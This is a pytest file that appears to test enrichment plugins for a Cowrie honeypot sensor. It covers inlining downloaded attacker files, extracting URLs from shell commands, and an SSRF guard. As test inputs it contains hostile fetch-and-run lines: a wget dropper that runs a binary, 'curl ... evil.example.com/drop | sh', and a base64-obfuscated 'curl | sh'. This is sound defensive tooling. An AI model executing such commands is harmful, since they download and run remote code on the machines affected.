"""Pure-logic tests for the enrichment-enabled sensor plugins.

The cowrie clone isn't pip-installed in this repo's venv, so we stub the
heavy imports (twisted, cowrie.core, fluent) and load the two plugin modules
straight from their files. This exercises exactly the logic the c2-engine
contract depends on: byte-inlining shape and URL extraction.

Run:  pytest sensor/tests/
"""

from __future__ import annotations

import base64
import importlib.util
import sys
import types
from pathlib import Path

import pytest

CLONE = Path(__file__).resolve().parents[1] / "cowrie" / "src" / "cowrie"


def _install_stubs() -> None:
    """Minimal stand-ins so the plugin modules import without real deps."""
    def mod(name: str) -> types.ModuleType:
        m = types.ModuleType(name)
        sys.modules[name] = m
        if "." in name:  # wire as an attribute of the parent package
            parent, _, child = name.rpartition(".")
            setattr(sys.modules[parent], child, m)
        return m

    fluent = mod("fluent")
    fluent.sender = types.SimpleNamespace(FluentSender=object)

    mod("cowrie")
    mod("cowrie.core")
    core_output = mod("cowrie.core.output")
    core_output.Output = type("Output", (), {"__init__": lambda self: None})
    core_config = mod("cowrie.core.config")
    core_config.CowrieConfig = types.SimpleNamespace(
        get=lambda *a, **k: k.get("fallback", ""),
        getint=lambda *a, **k: k.get("fallback", 0),
        getboolean=lambda *a, **k: k.get("fallback", False),
    )

    mod("twisted")
    twisted_internet = mod("twisted.internet")
    twisted_internet.reactor = types.SimpleNamespace(
        callInThread=lambda *a, **k: None, callFromThread=lambda *a, **k: None
    )
    twisted_python = mod("twisted.python")
    twisted_python.log = types.SimpleNamespace(msg=lambda *a, **k: None)


def _load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    assert spec and spec.loader
    spec.loader.exec_module(module)
    return module


@pytest.fixture(scope="module")
def plugins():
    _install_stubs()
    stingar = _load("_sensor_stingar", CLONE / "plugins" / "stingar.py")
    url_fetcher = _load("_sensor_url_fetcher", CLONE / "output" / "url_fetcher.py")
    return stingar, url_fetcher


# --- byte inlining (stingar.py) ------------------------------------------

def test_inline_download_bytes(plugins, tmp_path) -> None:
    stingar, _ = plugins
    dropper = b"#!/bin/sh\nwget http://5.6.7.8/bins/mips; chmod +x mips; ./mips\n"
    f = tmp_path / "8c1bd271"
    f.write_bytes(dropper)

    out = stingar.Output.__new__(stingar.Output)
    out.inline_max = stingar.CONTENT_INLINE_MAX
    hp = {"files": [{"action": "download", "status": "successful", "outfile": str(f)}]}
    out._inline_download_bytes(hp)

    # Inlined and round-trips to the exact dropper the c2-engine fixture expects.
    assert base64.b64decode(hp["files"][0]["content_b64"]) == dropper


def test_oversized_file_ships_hash_only(plugins, tmp_path) -> None:
    stingar, _ = plugins
    f = tmp_path / "big"
    f.write_bytes(b"x" * 2048)

    out = stingar.Output.__new__(stingar.Output)
    out.inline_max = 1024  # below file size
    hp = {"files": [{"action": "download", "status": "successful", "outfile": str(f)}]}
    out._inline_download_bytes(hp)

    assert "content_b64" not in hp["files"][0]  # graceful degrade


def test_upload_and_failed_not_inlined(plugins, tmp_path) -> None:
    stingar, _ = plugins
    f = tmp_path / "u"
    f.write_bytes(b"data")
    out = stingar.Output.__new__(stingar.Output)
    out.inline_max = stingar.CONTENT_INLINE_MAX
    hp = {
        "files": [
            {"action": "upload", "status": "successful", "outfile": str(f)},
            {"action": "download", "status": "failed", "outfile": str(f)},
        ]
    }
    out._inline_download_bytes(hp)
    assert all("content_b64" not in x for x in hp["files"])


# --- URL extraction (url_fetcher.py) -------------------------------------

def test_native_downloader_skipped(plugins) -> None:
    """A bare `wget URL` is left to Cowrie's native emulator (no double-fetch)."""
    _, uf = plugins
    assert uf.extract_urls("wget http://1.2.3.4/x") == []


def test_wrapper_hidden_url_extracted(plugins) -> None:
    _, uf = plugins
    urls = uf.extract_urls("nohup bash -c 'curl -s http://evil.example.com/drop | sh' &")
    assert "http://evil.example.com/drop" in urls


def test_base64_wrapped_url_extracted(plugins) -> None:
    # url_fetcher's echo|base64 pattern requires the blob quoted. An UNquoted
    # blob is missed here, but the c2-engine still recovers the host as a
    # rank-0 shell_reference (its extractor scans all base64-ish runs), so the
    # worst case is served_file -> shell_reference degradation, never silence.
    _, uf = plugins
    blob = base64.b64encode(b"curl http://9.9.9.9/x | sh").decode()
    urls = uf.extract_urls(f'echo "{blob}" | base64 -d | sh')
    assert "http://9.9.9.9/x" in urls


def test_resolve_ip_literal_passthrough(plugins) -> None:
    _, uf = plugins
    assert uf._resolve("203.0.113.9") == "203.0.113.9"


def test_ssrf_guard_blocks_private(plugins) -> None:
    _, uf = plugins
    assert uf.url_is_fetchable("http://169.254.169.254/latest/meta-data/") is False
    assert uf.url_is_fetchable("http://8.8.8.8/x") is True
